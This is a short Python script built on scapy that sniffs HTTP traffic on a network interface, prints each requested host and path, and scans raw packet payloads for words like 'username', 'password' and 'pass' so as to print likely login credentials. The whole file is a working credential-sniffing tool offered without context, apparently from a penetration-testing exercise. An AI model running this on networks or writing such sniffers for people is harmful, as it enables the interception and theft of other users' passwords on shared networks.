#!/usr/bin/env python
import argparse
import scapy.all as scapy
from scapy.layers import http


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface")
    options = parser.parse_args()
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_package)
    # Do not store packets in mem.


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'password', 'email', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load.lower():
                return load


def process_sniffed_package(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>" + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password" + login_info + "\n\n")


sniff(get_arguments().interface)
